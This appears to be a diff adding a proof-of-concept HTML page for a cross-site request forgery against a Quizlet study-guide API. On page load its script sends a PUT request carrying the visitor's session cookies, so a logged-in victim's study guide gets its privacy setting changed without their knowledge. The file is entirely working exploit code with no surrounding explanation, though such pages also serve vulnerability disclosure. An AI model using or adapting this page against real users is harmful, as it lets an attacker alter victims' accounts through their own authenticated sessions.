@@ -1,0 +1,21 @@
+<html>
+  <body onload="submitForm()">
+    <script>
+      function submitForm() {
+        fetch("https://quizlet.com/webapi/3.11/study-guides/32e3d72c-15a4-4fb7-9181-f5aa50e98ef9", {
+          method: "PUT", // Using PUT method here
+          credentials: "include", // Important! This will send the session cookies with the request
+          headers: {
+            "Content-Type": "application/json", // Content type for sending JSON data
+          },
+          body: JSON.stringify({
+            private: true, // This is the data you want to modify (privacy setting)
+          })
+        })
+        .then(response => response.json()) // If needed, process the response
+        .then(data => console.log("Privacy settings updated", data)) // Optional, for debugging
+        .catch(error => console.error("Error in request:", error)); // Optional, for error handling
+      }
+    </script>
+  </body>
+</html>
